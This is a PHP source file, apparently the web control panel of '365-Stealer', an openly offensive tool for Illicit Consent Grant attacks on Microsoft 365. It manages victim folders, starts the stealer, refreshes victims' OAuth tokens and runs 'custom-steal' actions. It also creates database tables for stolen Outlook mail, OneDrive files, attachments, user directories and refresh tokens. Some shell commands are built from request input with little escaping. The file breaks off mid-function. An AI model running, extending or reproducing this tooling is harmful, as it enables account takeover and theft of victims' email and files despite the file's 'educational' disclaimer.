<?php

# 365-Stealer is a tool used for performing Illicit Consent Grant attacks.
#
# Created by Vishal Raj at Altered Security Pte Ltd.
# Copyright (C) Altered Security Pte Ltd.
# All rights reserved to Altered Security Pte Ltd.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.
#
# This tool is meant for educational purposes only. 
# The creator takes no responsibility of any mis-use of this tool.


   // Ensure the use of a secure connection
   // if (empty($_SERVER['HTTPS']) || $_SERVER['HTTPS'] === "off") {
   //    $redirect = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
   //    header("Location: $redirect");
   //    exit;
   // }

   session_start();
   
   if (!isset($_SESSION['initiated'])) {
      session_regenerate_id(true);
      $_SESSION['initiated'] = true;
   }

   ### Path Traversal Protection ###
	$baseDir = realpath(__DIR__); # Base Directory-> C:\xampp\htdocs\365-Stealer\yourVictims
	$dirParam = urldecode($_GET['dir'] ?? '');
	
	if (strpos($dirParam, "\0") !== false || preg_match('#\.\./#', $dirParam)) {
		die("Access denied: Invalid path.");
	}

	$resolvedPath = realpath($baseDir . '/' . $dirParam);
	# echo $resolvedPath;

	if ($resolvedPath === false || strpos($resolvedPath, $baseDir) !== 0) {
		die("Access denied: Invalid path.");
	}


   date_default_timezone_set('Asia/Kolkata'); // Replace 'Asia/Kolkata' with the correct time zone, e.g., 'UTC', 'America/Los_Angeles', etc.
  // echo "The current time is " . date('h:i:s A') . " in the timezone: " . date_default_timezone_get(); //For debugging
   
   if (!isset($_SESSION['user'])) {
      header("Location: login.php");
      exit();
      }
   // Check if the user has changed their password
   if ($_SESSION['password_changed'] == 0) {
      header("Location: changepass.php"); // Redirect to change password page
      exit();
   }

   // Set the inactivity timeout duration (1440 seconds = 24 minutes)
   $timeout_duration = 1440;
   // If the request is to reset the session, update the last activity time
   if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['reset_session'])) {
      $_SESSION['last_activity'] = time();
      exit(); // End the script after resetting the session to prevent further output
   }
   if (isset($_SESSION['last_activity'])) {
      // Calculate the time difference since the last activity
      $time_difference = time() - $_SESSION['last_activity'];

      // If the time difference exceeds the timeout duration, log out the user
      if ($time_difference > $timeout_duration) {
         session_unset();
         session_destroy();
 
         // Store the timeout message in a session variable
         session_start();  // Restart the session to set the message
         $_SESSION['timeout_message'] = "⚠️ You have been automatically logged out due to inactivity of 1440 seconds.";
 
         header("Location: login.php");
         exit();
     }
   }
   // Update the last activity time on every request to keep the session alive
   $_SESSION['last_activity'] = time();

   // error reporting is turned off
   error_reporting(0);

   class DirectoryListing {
   
      // Database location where all victim's data is stored using 365-Stealer
      public $databasePath = "../database.db";
       
      // Path of 365-Stealer.py
      public $stealerPath = "../365-Stealer.py";
       
     // python or python3
      public $python3 = "python"; // if using linux use python3
       
      // The top level directory where this script is located, or alternatively one of it's sub-directories
      public $startDirectory = '.';
   
      // An optional title to show in the address bar and at the top of your page (set to null to leave blank)
      public $pageTitle = '365-Stealer Management';
   
      // The URL of this script. Optionally set if your server is unable to detect the paths of files
      public $includeUrl = false;

      // The base URL for directory links (used if $includeUrl is true)
      public $directoryUrl = null;
   
      // Set to true to list all sub-directories and allow them to be browsed
      public $showSubDirectories = true;
   
      // Set to true to open all file links in a new browser tab
      public $openLinksInNewTab = true;
   
      // Set to true to show thumbnail previews of any images
      public $showThumbnails = true;
   
      // Set to true to allow new directories to be created.
      public $enableDirectoryCreation = true;
   
      // Set to true to enable file deletion options
      public $enableFileDeletion = true;
   
      // Set to true to enable directory deletion options (only available when the directory is empty)
      public $enableDirectoryDeletion = true;
       
      // Optional. Allow restricted access only to whitelisted IP addresses
      public $enableIpWhitelist = false;
   
      // List of IP's to allow access to the script (only used if $enableIpWhitelist is true)
      public $ipWhitelist = array(
         '127.0.0.1',
         '::1'
        
      );
   
      // File extensions to block from showing in the directory listing
      public $ignoredFileExtensions = array(
         'php',
         'ini',
         'md'
      );
   
      // File names to block from showing in the directory listing
      public $ignoredFileNames = array(
         '.htaccess',
         '.DS_Store',
         'Thumbs.db'
        
      );
   
      // Directories to block from showing in the directory listing
      public $ignoredDirectories = array(
         'assets',
         'partials'
    );
   
      // Files that begin with a dot are usually hidden files. Set this to false if you wish to show these hiden files.
      public $ignoreDotFiles = true;
   
      // Works the same way as $ignoreDotFiles but with directories.
      public $ignoreDotDirectories = true;
   
      private $__previewMimeTypes = array(
         'image/gif',
         'image/jpeg',
         'image/png',
         'image/bmp',
         'plain/text'
      );
   
      private $__currentDirectory = null;
   
      private $__fileList = array();
   
      private $__directoryList = array();
   
      private $__debug = true;
   
      public $sortBy = 'name';
   
      public $sortableFields = array(
         'name',
         'size',
         'modified'
      );
   
      private $__sortOrder = 'asc';
   
      public function __construct() {
         define('DS', '/');
      }
   
      public function run() {
         if ($this->enableIpWhitelist) {
            $this->__ipWhitelistCheck();
         }
   
         $this->__currentDirectory = $this->startDirectory;
   
         // Sorting
         if (isset($_GET['order']) && in_array($_GET['order'], $this->sortableFields)) {
            $this->sortBy = $_GET['order'];
         }
   
         if (isset($_GET['sort']) && ($_GET['sort'] == 'asc' || $_GET['sort'] == 'desc')) {
            $this->__sortOrder = $_GET['sort'];
         }
   
         if (isset($_REQUEST['dir'])) {
            if (isset($_GET['delete']) && $this->enableDirectoryDeletion) {
               $this->deleteDirectory();
            }
   
            $this->__currentDirectory = $_REQUEST['dir'];
            return $this->__display();
         } elseif (isset($_GET['preview'])) {
            $preview = $this->previewFile($_GET['preview']);
         } else {
            return $this->__display();
         }
      }
   
      // New function to handle the file preview using cURL
      private function previewFile($fileUrl) {
         $httpsPort = $_SERVER['SERVER_PORT'];
         $previewUrl = "https://" . $_SERVER['SERVER_NAME'] . ":" . $httpsPort . $fileUrl;

         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $previewUrl);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL verification (not recommended for production)
         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // Disable host name verification

         // Set cookies to maintain the session
         if (!empty($_COOKIE)) {
            $cookieStr = '';
            foreach ($_COOKIE as $key => $value) {
                $cookieStr .= $key . '=' . $value . '; ';
            }
            curl_setopt($ch, CURLOPT_COOKIE, $cookieStr);
         }

         $prev = curl_exec($ch);

         if ($prev === false) {
            return "cURL Error: " . curl_error($ch);
         } else {
            return htmlentities($prev);
         }

         curl_close($ch);
      }
   
      
      public function deleteFile() {
         if (isset($_GET['deleteFile'])) {
            $file = $_GET['deleteFile'];
   
            // Clean file path
            $file = str_replace('..', '', $file);
            $file = ltrim($file, "/");
   
            // Work out full file path
            $filePath = __DIR__ . $this->__currentDirectory . '/' . $file;
   
            if (file_exists($filePath) && is_file($filePath)) {
               return unlink($filePath);
            }
            return false;
         }
      }
       
      public function deleteDirectory() {
         if (isset($_REQUEST['dir'])) {
            $dir = $_REQUEST['dir'];
            // Clean dir path
            $dir = str_replace('..', '', $dir);
            $dir = ltrim($dir, "/");
   
            // Work out full directory path
            $dirPath = __DIR__ . '/' . $dir;
            if(!strpos($_REQUEST['dir'], '/')){
             exec("$this->python3 $this->stealerPath --delete-user-data $dir --database-path $this->databasePath");
                 
             }
            if (file_exists($dirPath) && is_dir($dirPath)) {
   
               $iterator = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
               $files = new RecursiveIteratorIterator($iterator, RecursiveIteratorIterator::CHILD_FIRST);
   
               foreach ($files as $file) {
                  if ($file->isDir()) {
                     rmdir($file->getRealPath());
                  } else {
                     unlink($file->getRealPath());
                  }
               }
               return rmdir($dir);
            }
         }
         return false;
      }
   
      public function sortUrl($sort) {
   
         // Get current URL parts
         $urlParts = parse_url($_SERVER['REQUEST_URI']);
         $urlParts = str_replace("login.php", "", $urlParts);
         $url = '';
   
         if (isset($urlParts['scheme'])) {
            $url = $urlParts['scheme'] . '://';
         }
   
         if (isset($urlParts['host'])) {
            $url .= $urlParts['host'];
         }
   
         if (isset($urlParts['path'])) {
            $url .= $urlParts['path'];
         }
   
   
         // Extract query string
         if (isset($urlParts['query'])) {
            $queryString = $urlParts['query'];
   
            parse_str($queryString, $queryParts);
   
            // work out if we're already sorting by the current heading
            if (isset($queryParts['order']) && $queryParts['order'] == $sort) {
               // Yes we are, just switch the sort option!
               if (isset($queryParts['sort'])) {
                  if ($queryParts['sort'] == 'asc') {
                     $queryParts['sort'] = 'desc';
                  } else {
                     $queryParts['sort'] = 'asc';
                  }
               }
            } else {
               $queryParts['order'] = $sort;
               $queryParts['sort'] = 'asc';
            }
   
            // Now convert back to a string
            $queryString = http_build_query($queryParts);
   
            $url .= '?' . $queryString;
         } else {
            $order = 'asc';
            if ($sort == $this->sortBy) {
               $order = 'desc';
            }
            $queryString = 'order=' . $sort . '&sort=' . $order;
            $url .= '?' . $queryString;
         }
         return  $url;
      }
   
      public function sortClass($sort) {
         $class = $sort . '_';
   
         if ($this->sortBy == $sort) {
            if ($this->__sortOrder == 'desc') {
               $class .= 'desc sort_desc';
            } else {
               $class .= 'asc sort_asc';
            }
         } else {
            $class = '';
         }
         return $class;
      }
   
      private function __ipWhitelistCheck() {
         // Get the users ip
         $userIp = $_SERVER['REMOTE_ADDR'];
   
         if (!in_array($userIp, $this->ipWhitelist)) {
            header('HTTP/1.0 403 Forbidden');
            die('Your IP address (' . $userIp . ') is not authorized to access this site.');
         }
      }
   
      private function __display() {
         if ($this->__currentDirectory != '.' && !$this->__endsWith($this->__currentDirectory, DS)) {
            $this->__currentDirectory = $this->__currentDirectory . DS;
         }
   
         return $this->__loadDirectory($this->__currentDirectory);
      }
   
      private function __loadDirectory($path) {
         $files = $this->__scanDir($path);
   
         if (! empty($files)) {
            // Strip excludes files, directories and filetypes
            $files = $this->__cleanFileList($files);
            foreach ($files as $file) {
               $filePath = realpath($this->__currentDirectory . DS . $file);
   
               if ($this->__isDirectory($filePath)) {
   
                  if (! $this->includeUrl) {
                     $urlParts = parse_url($_SERVER['REQUEST_URI']);
                     $urlParts = str_replace("login.php", "", $urlParts);
   
                     $dirUrl = '';
   
                     if (isset($urlParts['scheme'])) {
                        $dirUrl = $urlParts['scheme'] . '://';
                     }
   
                     if (isset($urlParts['host'])) {
                        $dirUrl .= $urlParts['host'];
                     }
   
                     if (isset($urlParts['path'])) {
                        $dirUrl .= $urlParts['path'];
                     }
                  } else {
                     $dirUrl = $this->directoryUrl;
                  }
   
                  if ($this->__currentDirectory != '' && $this->__currentDirectory != '.') {
                     $dirUrl .= '?dir=./' . rawurlencode($this->__currentDirectory) . rawurlencode($file);
                  } else {
                     $dirUrl .= '?dir=./' . rawurlencode($file);
                  }
   
                  $this->__directoryList[$file] = array(
                     'name' => rawurldecode($file),
                     'path' => $filePath,
                     'type' => 'dir',
                     'url' => $dirUrl
                  );
               } else {
                  $this->__fileList[$file] = $this->__getFileType($filePath, $this->__currentDirectory . DS . $file);
               }
            }
         }
   
         if (! $this->showSubDirectories) {
            $this->__directoryList = null;
         }
   
         $data = array(
            'currentPath' => $this->__currentDirectory,
            'directoryTree' => $this->__getDirectoryTree(),
            'files' => $this->__setSorting($this->__fileList),
            'directories' => $this->__directoryList
         );
   
         return $data;
      }
   
      private function __setSorting($data) {
         $sortOrder = '';
         $sortBy = '';
   
         // Sort the files
         if ($this->sortBy == 'name') {
            function compareByName($a, $b) {
               return strnatcasecmp($a['name'], $b['name']);
            }
   
            usort($data, 'compareByName');
            $this->sortBy = 'name';
         } elseif ($this->sortBy == 'size') {
            function compareBySize($a, $b) {
               return strnatcasecmp($a['size_bytes'], $b['size_bytes']);
            }
   
            usort($data, 'compareBySize');
            $this->sortBy = 'size';
         } elseif ($this->sortBy == 'modified') {
            function compareByModified($a, $b) {
               return strnatcasecmp($a['modified'], $b['modified']);
            }
   
            usort($data, 'compareByModified');
            $this->sortBy = 'modified';
         }
   
         if ($this->__sortOrder == 'desc') {
            $data = array_reverse($data);
         }
         return $data;
      }
   
      private function __scanDir($dir) {
         // Prevent browsing up the directory path.
         if (strstr($dir, '../')) {
            return false;
         }
   
         if ($dir == '/') {
            $dir = $this->startDirectory;
            $this->__currentDirectory = $dir;
         }
   
         $strippedDir = str_replace('/', '', $dir);
   
         $dir = ltrim($dir, "/");
   
         // Prevent listing blacklisted directories
         if (in_array($strippedDir, $this->ignoredDirectories)) {
            return false;
         }
   
         if (! file_exists($dir) || !is_dir($dir)) {
            return false;
         }
   
         return scandir($dir);
      }
   
      private function __cleanFileList($files) {
         $this->ignoredDirectories[] = '.';
         $this->ignoredDirectories[] = '..';
         foreach ($files as $key => $file) {
   
            // Remove unwanted directories
            if ($this->__isDirectory(realpath($file)) && in_array($file, $this->ignoredDirectories)) {
               unset($files[$key]);
            }
   
            // Remove dot directories (if enables)
            if ($this->ignoreDotDirectories && substr($file, 0, 1) === '.') {
               unset($files[$key]);
            }
   
            // Remove unwanted files
            if (! $this->__isDirectory(realpath($file)) && in_array($file, $this->ignoredFileNames)) {
               unset($files[$key]);
            }
            // Remove unwanted file extensions
            if (! $this->__isDirectory(realpath($file))) {
   
               $info = pathinfo(mb_convert_encoding($file, 'UTF-8', 'UTF-8'));
   
               if (isset($info['extension'])) {
                  $extension = $info['extension'];
   
                  if (in_array($extension, $this->ignoredFileExtensions)) {
                     unset($files[$key]);
                  }
               }
   
               // If dot files want ignoring, do that next
               if ($this->ignoreDotFiles) {
   
                  if (substr($file, 0, 1) == '.') {
                     unset($files[$key]);
                  }
               }
            }
         }
         return $files;
      }
   
      private function __isDirectory($file) {
         if ($file == $this->__currentDirectory . DS . '.' || $file == $this->__currentDirectory . DS . '..') {
            return true;
         }
         $file = mb_convert_encoding($file, 'UTF-8', 'UTF-8');
   
         if (filetype($file) == 'dir') {
            return true;
         }
   
         return false;
      }
   
      /**
       * __getFileType
       *
       * Returns the formatted array of file data used for thre directory listing.
       *
       * @param  string $filePath Full path to the file
       * @return array   Array of data for the file
       */
      private function __getFileType($filePath, $relativePath = null) {
         $fi = new finfo(FILEINFO_MIME_TYPE);
   
         if (! file_exists($filePath)) {
            return false;
         }
   
         $type = $fi->file($filePath);
   
         $filePathInfo = pathinfo($filePath);
   
         $fileSize = filesize($filePath);
   
         $fileModified = filemtime($filePath);
   
         $filePreview = false;
   
         // Check if the file type supports previews
         if ($this->__supportsPreviews($type) && $this->showThumbnails) {
            $filePreview = true;
         }
   
         return array(
            'name' => $filePathInfo['basename'],
            'extension' => (isset($filePathInfo['extension']) ? $filePathInfo['extension'] : null),
            'dir' => $filePathInfo['dirname'],
            'path' => $filePath,
            'relativePath' => $relativePath,
            'size' => $this->__formatSize($fileSize),
            'size_bytes' => $fileSize,
            'modified' => $fileModified,
            'type' => 'file',
            'mime' => $type,
            'url' => $this->__getUrl($filePathInfo['basename']),
            'preview' => $filePreview,
            'target' => ($this->openLinksInNewTab ? '_blank' : '_parent')
         );
      }
   
      private function __supportsPreviews($type) {
         if (in_array($type, $this->__previewMimeTypes)) {
            return true;
         }
         return false;
      }
   
      private function __getUrl($file) {
         if (! $this->includeUrl) {
            $dirUrl = $_SERVER['REQUEST_URI'];
   
            $urlParts = parse_url($_SERVER['REQUEST_URI']);
            $urlParts = str_replace("login.php", "", $urlParts);
            $dirUrl = '';
   
            if (isset($urlParts['scheme'])) {
               $dirUrl = $urlParts['scheme'] . '://';
            }
   
            if (isset($urlParts['host'])) {
               $dirUrl .= $urlParts['host'];
            }
   
            if (isset($urlParts['path'])) {
               $dirUrl .= $urlParts['path'];
            }
         } else {
            $dirUrl = $this->directoryUrl;
         }
   
         if ($this->__currentDirectory != '.') {
            $dirUrl = $dirUrl . $this->__currentDirectory;
         }
         return $dirUrl . rawurlencode($file);
      }
   
      private function __getDirectoryTree() {
         $dirString = $this->__currentDirectory;
         $directoryTree = array();
   
         $directoryTree[''] = '<b>Index</b>';
   
         if (substr_count($dirString, '/') >= 0) {
            $items = explode("/", $dirString);
            $items = array_filter($items);
            $path = '';
            foreach ($items as $item) {
               if ($item == '.' || $item == '..') {
                  continue;
               }
               $path .= rawurlencode($item) . '/';
               $directoryTree[$path] = $item;
            }
         }
   
         $directoryTree = array_filter($directoryTree);
   
         return $directoryTree;
      }
   
      private function __endsWith($haystack, $needle) {
         return $needle === "" || (($temp = strlen($haystack) - strlen($needle)) >= 0 && strpos($haystack, $needle, $temp) !== false);
      }
   
      private function __generatePreview($filePath) {
         $file = $this->__getFileType($filePath);
   
         if ($file['mime'] == 'image/jpeg') {
            $image = imagecreatefromjpeg($file['path']);
         } elseif ($file['mime'] == 'image/png') {
            $image = imagecreatefrompng($file['path']);
         } elseif ($file['mime'] == 'image/gif') {
            $image = imagecreatefromgif($file['path']);
         } else {
            die();
         }
   
         $oldX = imageSX($image);
         $oldY = imageSY($image);
   
         $newW = 250;
         $newH = 250;
   
         if ($oldX > $oldY) {
            $thumbW = $newW;
            $thumbH = $oldY * ($newH / $oldX);
         }
         if ($oldX < $oldY) {
            $thumbW = $oldX * ($newW / $oldY);
            $thumbH = $newH;
         }
         if ($oldX == $oldY) {
            $thumbW = $newW;
            $thumbH = $newW;
         }
   
         header('Content-Type: ' . $file['mime']);
   
         $newImg = ImageCreateTrueColor($thumbW, $thumbH);
   
         imagecopyresampled($newImg, $image, 0, 0, 0, 0, $thumbW, $thumbH, $oldX, $oldY);
   
         if ($file['mime'] == 'image/jpeg') {
            imagejpeg($newImg);
         } elseif ($file['mime'] == 'image/png') {
            imagepng($newImg);
         } elseif ($file['mime'] == 'image/gif') {
            imagegif($newImg);
         }
         imagedestroy($newImg);
         die();
      }
   
      private function __formatSize($bytes) {
         $units = array('B', 'KB', 'MB', 'GB', 'TB');
   
         $bytes = max($bytes, 0);
         $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
         $pow = min($pow, count($units) - 1);
   
         $bytes /= pow(1024, $pow);
   
         return round($bytes, 2) . ' ' . $units[$pow];
      }
   
   }
   
   
    $listing = new DirectoryListing();
    $db = new SQLite3("$listing->databasePath");
   
    function AppexecInBackground($cmd) {
      if (substr(php_uname(), 0, 7) == "Windows"){
         pclose(popen('start /B start '. $cmd, "r")); 
      }
      else {
         exec($cmd . " > /dev/null &");  
         }
      }

   function execInBackground($cmd) {
      $output = [];
      $returnStatus = null;

      if (strncasecmp(PHP_OS, 'WIN', 3) == 0) {
            // For Windows
            $cmd = 'start /B ' . $cmd;
            exec($cmd, $output, $returnStatus);
      } else {
            // For Linux/Unix/Mac
            $cmd = $cmd . ' > /dev/null 2>&1 & echo $!';
            exec($cmd, $output, $returnStatus);
      }

         // Log the full command, output, and return status for debugging
         file_put_contents(
            'command.log', 
            "Executed Command: " . $cmd . "\nDate: " . date('Y-m-d H:i:s') . "\nOutput: " . implode("\n", $output) . "\nReturn Status: $returnStatus\n\n", 
            FILE_APPEND
        );
        
      return ['output' => $output, 'status' => $returnStatus];
   }
   
  if(isset($_REQUEST['run-app'])){
   if (isset($_GET['port']) && is_numeric($_GET['port'])) {
      $port = intval($_GET['port']);
      $protocolOption = (isset($_GET['protocol']) && $_GET['protocol'] == 'on') ? "" : "--no-ssl";
      $cmd = "$listing->python3 $listing->stealerPath --run-app --port $port $protocolOption";
      AppexecInBackground($cmd);
   
     header('location: ./?dir='.$_GET['dir'].'&message=365-Stealer%20Started!&type=success');
   }else {
      header('Location: ./index.php?message=Invalid Port Number!&type=error');
     exit();
   }
 }
   
    if(isset($_REQUEST['close-app'])){
        $cmd = "";
       if (substr(php_uname(), 0, 7) == "Windows"){
           exec('taskkill /IM "python*"');
       }
       else {
          exec('pkill -f "python*"');
      }
     header('location: ./?dir='.$_GET['dir'].'&message=365-Stealer Stopped!&type=warning');
      }
   
   $successMsg = null;
   $errorMsg = null;
   
   if (isset($_GET['deleteFile']) && $listing->enableFileDeletion) {
      if ($listing->deleteFile()) {
         $message = 'The file was successfully deleted!';
          $type  = 'success';
        $redirecturl = "./?dir=".$_GET['dir']."&message=".$message."&type=".$type;
        header("location: $redirecturl");
      } else {
        $message = 'The selected file could not be deleted. Please check your file permissions and try again.';
        $type  = 'danger';
        $redirecturl = "./?dir=".$_GET['dir']."&message=".$message."&type=".$type;
        header("location: $redirecturl");   
      }
   } elseif (isset($_REQUEST['dir']) && isset($_GET['delete']) && $listing->enableDirectoryDeletion) {
      if ($listing->deleteDirectory()) {
         $message = 'The directory was successfully deleted!';
         $type    = 'success';  
         unset($_REQUEST['dir']);
        header("location: ./?dir=" . $_GET['userfolderdel']."&message=$message&type=$type");
      } else {
         $message = 'The selected directory could not be deleted. Please check your file permissions and try again.';
         $type    = 'danger';  
         header("location: ./?dir=" . $_GET['userfolderdel']."&message=$message&type=$type");
      }
   }
   
   $data = $listing->run();
   
   function pr($data, $die = false) {
      echo '<pre>';
      print_r($data);
      echo '</pre>';
   
      if ($die) {
         die();
      }
   }

   if (isset($_GET['dir']) && isset($_GET['refreshuser'])) {
      $user = $_GET['dir'];
  
      // Sanitize the user input to prevent directory traversal or command injection
      if (strpos($user, '/') !== false) {
          $user = substr($user, 0, strpos($user, "/"));
      }
  
      // Check which actions were selected
      $selectedActions = isset($_GET['actions']) ? $_GET['actions'] : [];
  
      // Base command
      $command = escapeshellcmd("$listing->python3 $listing->stealerPath --refresh-user $user --database-path $listing->databasePath");

        
      // Determine the command based on the selected actions
      if (in_array('all', $selectedActions)) {
          // If 'All' is selected, execute the base command
          // No need to append anything else
      } elseif (!empty($selectedActions)) {
         // Handle multiple actions by passing each as a separate argument
         $command .= " --custom-steal " . implode(' ', array_map('escapeshellarg', $selectedActions));
     }

      // Execute the command in the background and capture the output and return status
      $executionResult = execInBackground($command);
      $output = $executionResult['output'];

      // Check the return status
      if (empty($output)) {
         $messages = "Failed to initiate the steal actions. Please check your command and try again.";
         $type = "error";
      } else {
            // Convert the output array to a string for easier searching
            $outputString = implode("\n", (array)$output);

            // Check for specific strings in the output
            if (strpos($outputString, "have office365 License") !== false) {
               preg_match('/Victim (.*) have office365 License!/', $outputString, $matches);
               $messages = isset($matches[0]) ? $matches[0] : "Victim has Office 365 License!";
               $type = "success";
            } elseif (strpos($outputString, "doesn't have office365 License") !== false) {
               preg_match('/Looks like Victim (.*) doesn\'t have office365 License!/', $outputString, $matches);
               $messages = isset($matches[0]) ? $matches[0] : "Victim doesn't have Office 365 License!";
               $type = "error";
            } else {
               $messages = "The steal actions have been initiated successfully! Check the logs for more details.";
               $type = "success";
            }
      }

      // Redirect with the message and type
      header('Location: ./?dir=' . urlencode($_GET['dir']) . '&message=' . urlencode($messages) . '&type=' . urlencode($type));
      exit();
   }
   
   if (isset($_GET['dir']) && isset($_GET['refreshusertoken'])) {
      $user = $_GET['dir'];

      $command = escapeshellcmd("$listing->python3 $listing->stealerPath --refresh-user $user --database-path $listing->databasePath --no-steal");
      $executionResult = execInBackground($command);
      $returnStatus = $executionResult['status'];
      $output = $executionResult['output'];
  
      $outputString = implode("\n", $output);

      // Check for specific strings in the output
      if (strpos($outputString, "Error:") !== false) {
         $messages = "Failed to refresh the access token. Check the logs for more details.";
         $type = "error";
      } else {
         $messages = "The access token has been refreshed successfully! Check the logs for more details.";
         $type = "success";
      }  
  
      header('Location: ./?dir=' . $user . '&message=' . urlencode($messages) . '&type=' . urlencode($type));
  }
   
   if (isset($_GET['refreshall'])) {
    $dir = $_GET['dir'];
    
    // Sanitize the user input to prevent directory traversal or command injection
    if (strpos($dir, '/') !== false) {
        $dir = substr($dir, 0, strpos($dir, "/"));
    }

    // Command to execute
    $command = "$listing->python3 $listing->stealerPath --refresh-all --database-path $listing->databasePath";

    // Execute the command in the background
    $executionSuccess = execInBackground($command);

    // Check the success of the command execution
    if ($executionSuccess) {
        $messages = "The refresh all actions have been initiated successfully!";
        $type = "success";
    } else {
        $messages = "Failed to initiate the refresh all actions. Please try again.";
        $type = "error";
    }

    // Redirect with the message and type
    header('Location: ./?dir=' . urlencode($dir) . '&message=' . urlencode($messages) . '&type=' . urlencode($type));
    exit();
}
    
    if(isset($_GET['autorefresh'])){
        
        if ($_GET['autorefresh'] == 'true'){
            $page = "./?autorefresh=true&dir=".$_GET['dir'];
            $sec = "2";
        }
    }
   
   
   if(!file_exists($listing->databasePath)){
       echo "<script>alert('$listing->databasePath')</script>";
       echo "Please define database path on line no 8";
       exit();
   }
   
   if(!file_exists($listing->stealerPath)){
       echo "<script>alert('$listing->stealerPath')</script>";
       echo "Please define 365-Stealer.py path on line no 11";
       exit();
   }
   
   if(!isset($_REQUEST['dir'])){ $_REQUEST['dir'] = "";}
   $sql1 = 'CREATE TABLE IF NOT EXISTS "Attachments" (
            "id"  TEXT,
            "username"  TEXT,
            "data"   BLOB,
            "filename"  TEXT,
            "size"   TEXT,
            "file_data_md5"   TEXT UNIQUE
        );';
        
    $sql2 = 'CREATE TABLE IF NOT EXISTS "oneDrive" (
            "id"  TEXT UNIQUE,
            "username"  TEXT,
            "data"   BLOB,
            "filename"  TEXT,
            "file_data_md5"   TEXT UNIQUE
        );';
        
        
    $sql3 = 'CREATE TABLE IF NOT EXISTS "outlook" (
            "id"  INTEGER UNIQUE,
            "username"  TEXT,
            "Body"   TEXT,
            "Sender" TEXT,
            "ToRecipients" TEXT,
            "BccRecipients"   TEXT,
            "CcRecipients" TEXT,
            "ReplyTo"   TEXT,
            "Subject"   TEXT,
            "Flag"   TEXT,
            "HasAttachments"  TEXT,
            "date"   TEXT
        );';
    $sql4 = 'CREATE TABLE IF NOT EXISTS "Allusers" (
            "displayName"  TEXT,
            "givenName" TEXT,
            "jobTitle"  TEXT,
            "mail"   TEXT,
            "mobilePhone"  TEXT,
            "officeLocation"  TEXT,
            "preferredLanguage"  TEXT,
            "surname"   INTEGER,
            "userPrincipalName"  TEXT,
            "id"  TEXT UNIQUE
        );';   
    $sql5 = 'CREATE TABLE IF NOT EXISTS "Token" (
            "username"  TEXT UNIQUE,
            "refreshtoken" TEXT,
            "clientId"  TEXT,
            "clientSecret" TEXT,
            "redirectUrl" TEXT
        );';
        
    $sql6 = 'CREATE TABLE IF NOT EXISTS "Config" (
            "client_id" TEXT,
            "client_secret"   TEXT,
            "redirect_url" TEXT,
            "redirect_after_stealing"  TEXT,
            "macros_file_path"   TEXT,
            "extension_onedrive" TEXT,
            "delay" INTEGER,
            "ID"  INTEGER UNIQUE
        );';
   
   $sql_create = "CREATE TABLE IF NOT EXISTS 'Config' (
            'client_id'	TEXT,
            'client_secret'	TEXT,
            'redirect_url'	TEXT,
            'redirect_after_stealing'	TEXT,
            'macros_file_path'	TEXT,
            'extension_onedrive' TEXT,
            'delay' INTEGER,
            'ID'	INTEGER UNIQUE)";
   
   $sql_insert = "INSERT OR IGNORE INTO Config
                  (client_id, client_secret, 
                  redirect_after_stealing, macros_file_path,
                  macros_file_path, extension_onedrive, delay, ID)
                  VALUES ('', '', '', '', '', '', '', 1)";
   
   $db->query($sql1);
   $db->query($sql2);
   $db->query($sql3);
   $db->query($sql4);
   $db->query($sql5);
   $db->query($sql6);
   $db->query($sql_create);
   $db->query($sql_insert);
   
   if (isset($_REQUEST['configuration'])) {
      $client_id               = $_REQUEST['clientID'];
      $client_secret           = $_REQUEST['clientSecret'];
      $redirect_url            = $_REQUEST['redirectUrl'];
      $redirect_after_stealing = $_REQUEST['redirectafterstealing'];
      $macros_file_path        = $_REQUEST['macroFilePath'];
      $extension_onedrive      = $_REQUEST['extensions'];
      $delay                   = intval($_REQUEST['delay']);
      if ($_REQUEST['delay'] == '') {
         $delay = "";
      }
  
      // Prepare the SQL statement with placeholders
      $stmt = $db->prepare("UPDATE Config SET 
                              client_id = :client_id, 
                              client_secret = :client_secret, 
                              redirect_url = :redirect_url, 
                              redirect_after_stealing = :redirect_after_stealing, 
                              extension_onedrive = :extension_onedrive, 
                              delay = :delay, 
                              macros_file_path = :macros_file_path");
  
      // Bind the actual values to the placeholders
      $stmt->bindValue(':client_id', $client_id, SQLITE3_TEXT);
      $stmt->bindValue(':client_secret', $client_secret, SQLITE3_TEXT);
      $stmt->bindValue(':redirect_url', $redirect_url, SQLITE3_TEXT);
      $stmt->bindValue(':redirect_after_stealing', $redirect_after_stealing, SQLITE3_TEXT);
      $stmt->bindValue(':extension_onedrive', $extension_onedrive, SQLITE3_TEXT);
      $stmt->bindValue(':delay', $delay, SQLITE3_INTEGER);
      $stmt->bindValue(':macros_file_path', $macros_file_path, SQLITE3_TEXT);
  
      // Execute the statement
      $stmt->execute();
  }
  
   
    $sql = $db->query("select * from Config limit 1");
    $row = $sql->fetchArray();
   
    $client_id               = $row['client_id'];
    $client_secret           = $row['client_secret'];
    $redirect_url            = $row['redirect_url'];
    $redirect_after_stealing = $row['redirect_after_stealing'];
    $macros_file_path        = $row['macros_file_path'];
    $extension_onedrive      = $row['extension_onedrive'];
    $delay                   = $row['delay'];
    $db->close();
   
   function callAPI($method, $url, $data, $access_token, $conType){
   $curl = curl_init();
   switch ($method)
   {
      case "POST":
          curl_setopt($curl, CURLOPT_POST, 1);
          if ($data) curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
          break;
      case "GET":
          curl_setopt($curl, CURLOPT_URL, 1);
          break;   
      case "DELETE":
          curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "DELETE");
          break;       
      case "PUT":
          curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "PUT");
